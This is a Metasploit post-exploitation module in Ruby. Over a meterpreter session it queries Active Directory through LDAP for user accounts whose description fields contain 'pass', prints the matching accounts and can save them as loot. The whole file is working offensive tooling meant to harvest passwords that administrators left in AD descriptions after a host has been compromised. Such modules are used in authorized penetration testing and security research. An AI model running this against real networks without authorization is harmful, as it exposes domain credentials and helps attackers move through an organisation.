##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex'
require 'msf/core'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post

  include Msf::Auxiliary::Report
  include Msf::Post::Windows::LDAP

  def initialize(info={})
    super( update_info( info,
        'Name'	       => 'Windows Gather Active Directory User Descriptions',
        'Description'  => %Q{
          This module will enumerate user accounts in the default AD directory. Which
        contain 'pass' in their description (case-insensitive) by default.
        },
        'License'      => MSF_LICENSE,
        'Author'       => [ 'Ben Campbell <eat_meatballs[at]hotmail.co.uk>' ],
        'Platform'     => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'References'	=>
        [
          ['URL', 'http://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx'],
        ]
      ))

    register_options([
      OptInt.new('MAX_SEARCH', [true, 'Maximum values to retrieve, 0 for all.', 50]),
      OptBool.new('STORE_LOOT', [true, 'Store file in loot.', false]),
      OptString.new('ATTRIBS', [true, 'Attributes to retrieve.', 'sAMAccountName,userAccountControl,description']),
      OptString.new('FILTER', [true, 'Search filter.', '(&(&(&(&(objectCategory=person)(objectClass=user)(description=*pass*)))))']),
    ], self.class)
  end

  def run
    print_status("Connecting to default LDAP server")
    session_handle = bind_default_ldap_server(datastore['MAX_SEARCH'])

    return false unless session_handle

    print_status("Querying default naming context")

    query_result = query_ldap(session_handle, "", 0, "(objectClass=user)", ["defaultNamingContext"])
    first_entry_attributes = query_result[0]['attributes']
    # Value from First Attribute of First Entry
    defaultNamingContext = first_entry_attributes[0]['values']

    print_status("Default Naming Context #{defaultNamingContext}")

    attributes = datastore['ATTRIBS'].gsub(/\s+/,"").split(',')

    search_filter = datastore['FILTER']

    print_status("Querying #{search_filter} - Please wait...")
    results = query_ldap(session_handle, defaultNamingContext, 2, search_filter, attributes)

    print_status("Unbinding from LDAP service.")
    wldap32.ldap_unbind(session_handle)

    if results.nil? or results.empty?
      return
    end

    # Results table holds raw string data
    results_table = Rex::Ui::Text::Table.new(
        'Header'     => "#{defaultNamingContext} Domain Users",
        'Indent'     => 1,
        'SortIndex'  => -1,
        'Columns'    => attributes
      )

    # Hostnames holds DNS Names to Resolve
    hostnames = []
    # Reports are collections for easy database insertion
    reports = []
    results.each do |result|
      row = []

      report = {}
      result['attributes'].each do |attr|
        if attr['values'].nil?
          row << ""
        else
          row << attr['values']
        end
      end

      reports << report
      results_table << row
    end

    print_line results_table.to_s
    if datastore['STORE_LOOT']
      stored_path = store_loot('ad.users', 'text/plain', session, results_table.to_csv)
      print_status("Results saved to: #{stored_path}")
    end
  end

end

